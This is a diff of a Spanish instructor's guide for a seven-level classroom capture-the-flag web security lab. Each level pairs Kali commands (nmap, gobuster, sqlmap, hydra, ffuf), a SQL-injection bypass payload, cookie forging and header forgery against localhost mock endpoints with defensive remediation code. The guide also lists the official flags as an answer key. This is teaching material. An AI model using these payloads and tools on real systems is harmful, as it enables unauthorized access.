@@ -1,94 +1,104 @@
 # GUÍA DEL INSTRUCTOR // CYBER LAB CTF (2º SMR)
 
-Documento pedagógico y técnico de referencia para el profesorado del módulo de **Seguridad Informática (SI)** y los alumnos de 2º SMR.
-Detalla la fundamentación teórica, los pasos exactos de explotación de cada uno de los 7 niveles del laboratorio y el código de remediación en entornos de producción.
+Documento pedagógico y técnico de referencia para el profesorado del módulo de **Seguridad Informática (SI)** y los alumnos de 2º SMR (Sistemas Microinformáticos y Redes).
+Detalla la fundamentación teórica (CWE / OWASP), el uso de herramientas de **Kali Linux / Ubuntu** en el emulador de terminal, los pasos de explotación y el código de remediación en producción.
 
 ---
 
-## Índice de Niveles y Banderas
+## Índice Curricular de Niveles, Herramientas Kali y Banderas
 
-| Nivel | Categoría | Vulnerabilidad Simulada | Flag Oficial | Puntos |
+| Nivel | Categoría & CWE | Herramientas Kali / Terminal | Flag Oficial | Puntos |
 | :--- | :--- | :--- | :--- | :--- |
-| **1** | Reconocimiento | Fuga de información en DOM y `robots.txt` | `FLAG{DOM_C0MM3NTS_4ND_R0B0TS}` | 100 |
-| **2** | Validación Cliente | Manipulación de campos ocultos y atributos `disabled` | `FLAG{N3V3R_TRUST_CL13NT_S1D3}` | 150 |
-| **3** | Sesiones | Cookie sin `HttpOnly` y manipulación Base64 | `FLAG{C00K13_T4MP3R1NG_SUCC3SS}` | 200 |
-| **4** | Control Acceso | Insecure Direct Object References (IDOR) en API | `FLAG{1D0R_4P1_BR0K3N_0BJ3CT}` | 250 |
-| **5** | Inyección | Inyección SQL Clásica (`' OR '1'='1' --`) | `FLAG{S4N1T1Z3_Y0UR_1NPUTS_SQL1}` | 300 |
-| **6** | Autenticación | Ataque de Diccionario / Fuerza Bruta | `FLAG{BR0K3N_4UTH_JWT_N0N3}` | 350 |
-| **7** | Cadena Completa | Reconocimiento + IDOR + Falsificación de Headers | `FLAG{FULL_CH41N_M4ST3R_H4CK3R}` | 500 |
+| **1** | Reconocimiento (`CWE-200`) | `nmap`, `gobuster`, `nikto`, `curl` | `FLAG{DOM_C0MM3NTS_4ND_R0B0TS}` | 100 |
+| **2** | Validación Cliente (`CWE-602`) | `curl` (payload JSON), DevTools | `FLAG{N3V3R_TRUST_CL13NT_S1D3}` | 150 |
+| **3** | Sesiones Inseguras (`CWE-565`) | `base64 -d`, `base64` en consola | `FLAG{C00K13_T4MP3R1NG_SUCC3SS}` | 200 |
+| **4** | Control de Acceso IDOR (`CWE-639`) | `curl -i`, `ffuf` (fuzzing) | `FLAG{1D0R_4P1_BR0K3N_0BJ3CT}` | 250 |
+| **5** | Inyección SQL (`CWE-89`) | `sqlmap` (simulado), payloads `' OR 1=1 --` | `FLAG{S4N1T1Z3_Y0UR_1NPUTS_SQL1}` | 300 |
+| **6** | Autenticación Rota (`CWE-307`) | `hydra`, `cat` (wordlists) | `FLAG{BR0K3N_4UTH_JWT_N0N3}` | 350 |
+| **7** | Cadena Completa (`CWE-269`) | `gobuster`, `curl` con headers forjados | `FLAG{FULL_CH41N_M4ST3R_H4CK3R}` | 500 |
 
 ---
 
 ## Nivel 1: Reconocimiento y Fugas en el Código
 
-### 1. Concepto Pedagógico
-En la fase de reconocimiento pasivo, un auditor analiza los recursos accesibles públicamente sin enviar tráfico anómalo. Los comentarios HTML olvidados por desarrolladores son una fuente común de fuga de nombres de servidores, rutas de backups y endpoints internos.
+### 1. Concepto Pedagógico & Estándares
+- **CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor).
+- **OWASP Top 10:** A01:2021 — Broken Access Control.
+- **Fundamento:** En la fase de reconocimiento (Footprinting & Enumeration), el analista busca fugas involuntarias en HTML, encabezados HTTP y ficheros de configuración (`robots.txt`, `.bak`). Los navegadores descargan todo el código sin compilar, por lo que los comentarios `<!-- -->` no ofrecen confidencialidad.
 
-### 2. Pasos de Explotación
-1. Abrir las herramientas de desarrollo del navegador pulsando **F12**.
-2. En la pestaña **Elements / Inspector**, inspeccionar el pie de página del portal SecureCorp.
-3. Localizar el comentario HTML:
-   ```html
-   <!-- 
-     TODO DE DESARROLLO (QUITAR EN PRODUCCIÓN):
-     - Fichero de exclusión de robots disponible en: /lab/robots.txt
-     - Copia de seguridad de notas de contingencia: /backup/staff_notes.txt
-     - Flag del equipo de infraestructura: FLAG{DOM_C0MM3NTS_4ND_R0B0TS}
-   -->
-   ```
-4. Alternativamente, en la terminal del laboratorio ejecutar:
-   ```bash
-   curl /lab/robots.txt
-   # o
-   cat /var/www/html/robots.txt
-   ```
+### 2. Comandos en Kali Linux / Ubuntu
+```bash
+# 1. Escaneo de servicios y puertos abiertos con nmap:
+nmap localhost
+
+# 2. Descubrimiento de rutas y archivos ocultos con diccionario (fuzzing):
+gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt
+
+# 3. Escaneo de desconfiguraciones del servidor web con nikto:
+nikto -h http://localhost
+
+# 4. Lectura directa del archivo robots.txt en consola:
+curl /lab/robots.txt
+# o directamente en el sistema de archivos:
+cat /var/www/html/robots.txt
+```
 
 ### 3. Código de Remediación Defensiva
-En aplicaciones modernas (Next.js, Vite, Webpack), configurar la eliminación automática de comentarios en la fase de empaquetado para producción:
 ```javascript
 // next.config.ts / webpack.config.js
-export default {
+module.exports = {
   compiler: {
     removeConsole: process.env.NODE_ENV === 'production',
   },
-  // NUNCA colocar secretos ni rutas críticas en robots.txt:
-  // La seguridad debe basarse en autenticación y autorización, no en ocultar rutas.
 };
+
+// Configuración Nginx (/etc/nginx/sites-available/default):
+// Denegar el acceso a archivos de backup y configuración:
+location ~* \.(bak|config|sql|old|txt|log)$ {
+  deny all;
+  return 404;
+}
 ```
 
 ---
 
-## Nivel 2: El Cliente No Es De Fiar
+## Nivel 2: El Cliente No Es De Fiar (Client-Side Validation Bypass)
 
-### 1. Concepto Pedagógico
-Las validaciones en JavaScript o atributos HTML (`disabled`, `maxlength`, `required`, `type="hidden"`) solo sirven para mejorar la experiencia de usuario (UX). **Cualquier dato o validación en el navegador es completamente manipulable por el usuario.**
+### 1. Concepto Pedagógico & Estándares
+- **CWE:** CWE-602 (Client-Side Enforcement of Server-Side Security).
+- **OWASP Top 10:** A04:2021 — Insecure Design.
+- **Fundamento:** Principio de autoridad del servidor. El frontend es un entorno hostil bajo el control físico del usuario. Cualquier validación hecha únicamente en HTML o JavaScript (`disabled`, `type="hidden"`, variables en cliente) puede ser eludida en segundos.
 
-### 2. Pasos de Explotación
-1. Abrir DevTools sobre el formulario de compra de certificación.
-2. Hacer doble clic sobre el atributo `disabled` en `<button id="btnBuy" disabled>` y borrarlo.
-3. Localizar el campo oculto `<input type="hidden" id="checkoutPrice" value="500">` y cambiar el `value` a `0`.
-4. Pulsar el botón **Adquirir Certificación**.
-5. *Vía alternativa por Consola*:
-   ```javascript
-   sessionStorage.setItem("lab_user_balance", "1000");
-   ```
-6. El backend simulado procesa la transacción con éxito y entrega la flag `FLAG{N3V3R_TRUST_CL13NT_S1D3}`.
+### 2. Comandos en Kali Linux / Ubuntu
+```bash
+# Envío de petición HTTP directa ignorando el frontend:
+curl -X POST http://localhost/api/checkout -d "price=0&itemId=cert-sec-01"
+```
 
 ### 3. Código de Remediación Defensiva
-El precio, el stock y los permisos deben consultarse siempre en la base de datos del servidor:
 ```typescript
+import { z } from "zod";
+
+const OrderSchema = z.object({
+  itemId: z.string().uuid(),
+  // ¡El precio NUNCA se acepta desde el cliente!
+});
+
 export async function POST(req: Request) {
-  const { itemId } = await req.json();
+  const session = await auth.getSession(req);
+  if (!session) return Response.json({ error: "No autenticado" }, { status: 401 });
 
-  // El precio se obtiene de la base de datos, NUNCA del payload del cliente
+  const { itemId } = OrderSchema.parse(await req.json());
+  
+  // Consultar precio y saldo en la base de datos:
   const product = await db.products.findById(itemId);
-  const user = await auth.getUser(req);
+  const user = await db.users.findById(session.userId);
 
-  if (user.balance < product.price) {
+  if (user.balance < product.officialPrice) {
     return Response.json({ error: "Saldo insuficiente" }, { status: 400 });
   }
 
-  await db.transactBalance(user.id, -product.price);
+  await db.transactPayment(user.id, product.officialPrice);
   return Response.json({ success: true });
 }
 ```
@@ -97,40 +107,38 @@ export async function POST(req: Request) {
 
 ## Nivel 3: Cookies Inseguras y Manipulación de Sesión
 
-### 1. Concepto Pedagógico
-Base64 es un sistema de codificación, no de cifrado. Si una cookie no tiene la bandera `HttpOnly` y almacena el rol sin firma criptográfica (HMAC), el usuario puede leerla con JavaScript y alterarla para escalar privilegios.
+### 1. Concepto Pedagógico & Estándares
+- **CWE:** CWE-565 (Reliance on Cookies without Validation) & CWE-384 (Session Fixation).
+- **OWASP Top 10:** A07:2021 — Identification and Authentication Failures.
+- **Fundamento:** Diferencia entre codificación (Base64) y firma/cifrado criptográfico. Base64 solo transforma bytes a texto ASCII; si una cookie no tiene firma (HMAC-SHA256) ni flag `HttpOnly`, el cliente puede alterar los datos y elevar privilegios.
 
-### 2. Pasos de Explotación
-1. Abrir DevTools -> Consola (o pestaña **Application -> Cookies**).
-2. Leer la cookie: `document.cookie` muestra `lab_session=eyJ1c2VyIjoic3R1ZGVudCIsInJvbGUiOiJndWVzdCJ9`.
-3. Decodificar en consola:
-   ```javascript
-   atob("eyJ1c2VyIjoic3R1ZGVudCIsInJvbGUiOiJndWVzdCJ9")
-   // Retorna: {"user":"student","role":"guest"}
-   ```
-4. Crear la nueva cookie con rol `admin`:
-   ```javascript
-   document.cookie = "lab_session=" + btoa(JSON.stringify({ user: "student", role: "admin" })) + "; path=/";
-   ```
-5. En el simulador, pulsar **Verificar Cookie de Sesión**. Se desbloquea `FLAG{C00K13_T4MP3R1NG_SUCC3SS}`.
+### 2. Comandos en Kali Linux / Ubuntu
+```bash
+# 1. Decodificar la cookie de sesión capturada:
+echo "eyJ1c2VyIjoic3R1ZGVudCIsInJvbGUiOiJndWVzdCJ9" | base64 -d
+# Salida: {"user":"student","role":"guest"}
+
+# 2. Codificar el nuevo payload forjado con rol admin:
+echo -n '{"user":"student","role":"admin"}' | base64
+# Salida: eyJ1c2VyIjoic3R1ZGVudCIsInJvbGUiOiJhZG1pbiJ9
+```
 
 ### 3. Código de Remediación Defensiva
-Firmar criptográficamente el token y añadir el flag `httpOnly: true`:
 ```typescript
 import crypto from "crypto";
 
-export function issueSessionCookie(payload: { userId: string; role: string }) {
-  const secret = process.env.ADMIN_SECRET_KEY!;
+export function createSecureSessionCookie(payload: { userId: string; role: string }) {
+  const secret = process.env.SESSION_SECRET; // Mínimo 32 bytes criptográficos
   const data = Buffer.from(JSON.stringify(payload)).toString("base64url");
   const signature = crypto.createHmac("sha256", secret).update(data).digest("base64url");
-  
+
   return {
-    name: "session_token",
+    name: "auth_session",
     value: `${data}.${signature}`,
-    httpOnly: true, // Impide el acceso desde document.cookie
-    secure: true,   // Solo viaja por HTTPS
+    httpOnly: true, // Impide el robo o lectura desde JavaScript (document.cookie)
+    secure: true,   // Exige HTTPS
     sameSite: "lax",
-    maxAge: 60 * 60 * 12, // 12 horas máximo
+    maxAge: 60 * 60 * 12,
   };
 }
 ```
@@ -139,74 +147,70 @@ export function issueSessionCookie(payload: { userId: string; role: string }) {
 
 ## Nivel 4: Insecure Direct Object References (IDOR)
 
-### 1. Concepto Pedagógico
-Ocurre cuando una API expone un objeto directamente mediante un parámetro (`?id=1042`) sin verificar que el usuario autenticado sea el dueño legítimo de dicho registro.
+### 1. Concepto Pedagógico & Estándares
+- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key).
+- **OWASP Top 10:** A01:2021 — Broken Access Control.
+- **Fundamento:** Ocurre cuando un endpoint REST expone un recurso directamente mediante un ID (`?id=1042`) sin verificar que el usuario que lo solicita tenga derechos de acceso sobre dicho registro.
 
-### 2. Pasos de Explotación
-1. Al consultar la factura #1042 en el simulador, observar la petición en la pestaña **Network (Red)**: `GET /api/mock/invoices?id=1042`.
-2. Probar identificadores inferiores para acceder a facturas de la directiva:
-   ```bash
-   curl /api/mock/invoices?id=1001
-   ```
-3. El servidor responde con la factura confidencial de la Dirección General y la bandera `FLAG{1D0R_4P1_BR0K3N_0BJ3CT}`.
+### 2. Comandos en Kali Linux / Ubuntu
+```bash
+# 1. Petición inspeccionando cabeceras y cuerpo con curl:
+curl -i "http://localhost/api/mock/invoices?id=1001"
+
+# 2. Fuzzing de identificadores de API en Kali con ffuf:
+ffuf -w ids.txt -u "http://localhost/api/mock/invoices?id=FUZZ"
+```
 
 ### 3. Código de Remediación Defensiva
-Aplicar control de acceso a nivel de fila (Row Level Security o filtro contextual):
 ```typescript
 export async function GET(req: Request) {
-  const session = await auth.verifySession(req);
+  const session = await auth.getSession(req);
   if (!session) return Response.json({ error: "No autorizado" }, { status: 401 });
 
   const invoiceId = Number(new URL(req.url).searchParams.get("id"));
 
-  // Se añade obligatoriamente el ID del usuario autenticado en la consulta
+  // ¡CRÍTICO! La consulta exige que el recurso pertenezca al usuario de la sesión:
   const invoice = await db.invoices.findFirst({
     where: {
       id: invoiceId,
-      ownerId: session.userId,
+      ownerId: session.userId, // Control de acceso contextual obligatorio
     },
   });
 
-  if (!invoice) {
-    return Response.json({ error: "Factura no encontrada" }, { status: 404 });
-  }
-
+  if (!invoice) return Response.json({ error: "No encontrado" }, { status: 404 });
   return Response.json(invoice);
 }
 ```
 
 ---
 
-## Nivel 5: Inyecciones: SQL Injection
+## Nivel 5: Inyecciones SQL (SQLi)
 
-### 1. Concepto Pedagógico
-Ocurre cuando entradas de usuario no sanitizadas se concatenan directamente en la sintaxis de una consulta SQL, alterando la lógica booleana del comando.
+### 1. Concepto Pedagógico & Estándares
+- **CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command).
+- **OWASP Top 10:** A03:2021 — Injection.
+- **Fundamento:** Concatenar cadenas de texto en sentencias SQL permite a caracteres como comillas simples (`'`) romper la estructura sintáctica e inyectar operadores lógicos (`OR 1=1`) y comentarios (`--`).
 
-### 2. Pasos de Explotación
-1. En el formulario de inicio de sesión vulnerable, observar la consulta generada:
-   ```sql
-   SELECT * FROM users WHERE username = '$user' AND password = '$password';
-   ```
-2. Introducir en el campo de usuario el payload:
-   ```sql
-   ' OR '1'='1' --
-   ```
-3. La consulta final evaluada se convierte en:
-   ```sql
-   SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...';
-   ```
-4. Como `'1'='1'` siempre es verdadero y `--` comenta el resto de la instrucción, la consulta devuelve la primera fila (administrador) y entrega `FLAG{S4N1T1Z3_Y0UR_1NPUTS_SQL1}`.
+### 2. Comandos en Kali Linux / Ubuntu
+```bash
+# 1. Auditoría automática con sqlmap en Kali Linux:
+sqlmap -u "http://localhost/login" --data="username=admin&password=x" --batch
+
+# 2. Payload manual de bypass de autenticación:
+# Usuario: ' OR '1'='1' --
+# Contraseña: (cualquiera)
+```
 
 ### 3. Código de Remediación Defensiva
-Utilizar siempre consultas preparadas / parametrizadas (Prepared Statements):
 ```typescript
 import { Pool } from "pg";
 const pool = new Pool();
 
-export async function authenticateUser(user: string, hash: string) {
-  // Los parámetros $1 y $2 se envían al motor SQL de forma aislada
+export async function loginUser(username: string, passwordHash: string) {
+  // Los parámetros $1 y $2 se envían al motor SQL de forma aislada.
+  // Cualquier comilla simple se procesa como texto literal plano:
   const query = "SELECT id, username, role FROM users WHERE username = $1 AND password_hash = $2";
-  const { rows } = await pool.query(query, [user, hash]);
+  const { rows } = await pool.query(query, [username, passwordHash]);
   return rows[0] || null;
 }
 ```
@@ -215,22 +219,24 @@ export async function authenticateUser(user: string, hash: string) {
 
 ## Nivel 6: Autenticación Rota y Fuerza Bruta
 
-### 1. Concepto Pedagógico
-Los endpoints de autenticación sin límite de intentos (Rate Limiting) permiten a herramientas automatizadas probar diccionarios de contraseñas débiles en pocos segundos.
+### 1. Concepto Pedagógico & Estándares
+- **CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts).
+- **OWASP Top 10:** A07:2021 — Identification and Authentication Failures.
+- **Fundamento:** Endpoints sin rate limiting permiten a herramientas automatizadas probar diccionarios de contraseñas débiles hasta encontrar la correcta en cuestión de segundos.
 
-### 2. Pasos de Explotación
-1. En la terminal del laboratorio, inspeccionar el diccionario disponible:
-   ```bash
-   cat /opt/wordlists/passwords.txt
-   ```
-2. Probar las contraseñas contra `/api/mock/auth` usando `curl`:
-   ```bash
-   curl -X POST /api/mock/auth -d "username=admin&password=hunter2"
-   ```
-3. El servidor confirma el inicio de sesión y entrega `FLAG{BR0K3N_4UTH_JWT_N0N3}`.
+### 2. Comandos en Kali Linux / Ubuntu
+```bash
+# 1. Inspección de listas de contraseñas:
+cat /opt/wordlists/passwords.txt
+
+# 2. Ataque de fuerza bruta multi-hilo con THC-Hydra:
+hydra -l admin -P /opt/wordlists/passwords.txt http-post-form "/api/mock/auth:username=^USER^&password=^PASS^:F=401"
+
+# 3. Petición POST manual con curl:
+curl -X POST /api/mock/auth -d "username=admin&password=hunter2"
+```
 
 ### 3. Código de Remediación Defensiva
-Implementar bloqueo de intentos (Rate Limiting) y hashing con Bcrypt/Argon2:
 ```typescript
 import bcrypt from "bcrypt";
 import { rateLimiter } from "@/lib/rateLimit";
@@ -239,8 +245,8 @@ export async function POST(req: Request) {
   const ip = req.headers.get("x-forwarded-for") || "unknown";
 
   // Máximo 5 intentos cada 15 minutos por IP
-  const allowed = await rateLimiter.check(ip, 5, 15 * 60 * 1000);
-  if (!allowed) {
+  const isAllowed = await rateLimiter.checkLimit(ip, { maxAttempts: 5, windowMs: 15 * 60 * 1000 });
+  if (!isAllowed) {
     return Response.json({ error: "Demasiados intentos. Bloqueado temporalmente." }, { status: 429 });
   }
 
@@ -251,7 +257,7 @@ export async function POST(req: Request) {
     return Response.json({ error: "Credenciales erróneas." }, { status: 401 });
   }
 
-  return Response.json({ success: true });
+  return Response.json({ success: true, token: issueSecureJwt(user) });
 }
 ```
 
@@ -259,45 +265,43 @@ export async function POST(req: Request) {
 
 ## Nivel 7: Cadena de Ataque Final (Full Exploit Chain)
 
-### 1. Concepto Pedagógico
-En auditorías profesionales, los atacantes encadenan múltiples vulnerabilidades:
-1. Reconocimiento (descubrimiento de endpoints en comentarios).
-2. IDOR / Exposición de API interna (obtención de tokens de empleados).
-3. Falsificación de cabeceras HTTP para tomar control de servidores centrales.
+### 1. Concepto Pedagógico & Estándares
+- **CWE:** CWE-269 (Improper Privilege Management).
+- **OWASP Top 10:** A01:2021 & A04:2021.
+- **Fundamento:** Encadenamiento de múltiples debilidades (Fuga en código -> IDOR en API interna -> Forja de cabeceras HTTP perimetrales) para comprometer el mainframe central.
 
-### 2. Pasos de Explotación
-1. **Paso 1: Reconocimiento**: Inspeccionar la intranet corporativa para localizar el comentario:
-   ```html
-   <!-- GET /api/mock/staff?dept=security -->
-   ```
-2. **Paso 2: IDOR en Personal**: En la terminal, consultar el endpoint:
-   ```bash
-   curl /api/mock/staff?dept=security
-   ```
-   Respuesta obtenida:
-   ```json
-   {
-     "departamento": "Seguridad y Ciberdefensa",
-     "jefe_departamento": {
-       "nombre": "Elena Ramos (CISO)",
-       "emp_id": "sec-9902",
-       "autorizacion": "emergency_override_2026"
-     }
-   }
-   ```
-3. **Paso 3: Falsificación de Cabeceras**: Enviar la petición al mainframe enviando las dos cabeceras:
-   ```bash
-   curl -H "X-Employee-Id: sec-9902" -H "Authorization: Bearer emergency_override_2026" /api/mock/admin/flag
-   ```
-4. El mainframe valida la identidad de Elena Ramos y entrega la bandera final del laboratorio:
-   `FLAG{FULL_CH41N_M4ST3R_H4CK3R}`.
+### 2. Comandos en Kali Linux / Ubuntu
+```bash
+# Paso 1: Fuzzing para descubrir APIs internas:
+gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt
+
+# Paso 2: Consulta del endpoint de personal para obtener credenciales del CISO:
+curl http://localhost/api/mock/staff?dept=security
+
+# Paso 3: Envío de petición con cabeceras forjadas al panel de contingencia:
+curl -H "X-Employee-Id: sec-9902" -H "Authorization: Bearer emergency_override_2026" http://localhost/api/mock/admin/flag
+```
 
 ### 3. Código de Remediación Defensiva
-Aplicar el principio de **Defensa en Profundidad** y **Zero Trust**:
-- Nunca confiar en cabeceras inyectadas por el cliente (`X-Employee-Id`).
-- Exigir tokens de sesión criptográficos firmados por un Proveedor de Identidad (IdP/OAuth/OIDC) y validar que el token pertenece al usuario y cuenta con MFA activo.
-- Mantener registros de auditoría inmutables en un servidor SIEM centralizado.
+```typescript
+export async function GET(req: Request) {
+  // Modelo Zero Trust: Cero confianza en cabeceras HTTP arbitrarias del cliente.
+  // Validación de identidad contra proveedor OIDC firmado:
+  const session = await verifySignedOidcSession(req);
+  if (!session || session.role !== "ciso") {
+    return Response.json({ error: "Acceso denegado: se requiere rol de CISO" }, { status: 403 });
+  }
+
+  // Verificación de segundo factor (MFA) en tiempo real:
+  const isMfaValid = await verifyMfaChallenge(session.userId);
+  if (!isMfaValid) {
+    return Response.json({ error: "Se requiere autenticación multifactor activa" }, { status: 401 });
+  }
+
+  return Response.json({ status: "Acceso concedido", secret: "..." });
+}
+```
 
 ---
 
-*Cyber Lab SMR2 · Aula 35 · Material didáctico oficial para 2º SMR.*
+*Material didáctico oficial para 2º SMR · Aula 35 · Módulo de Seguridad Informática.*
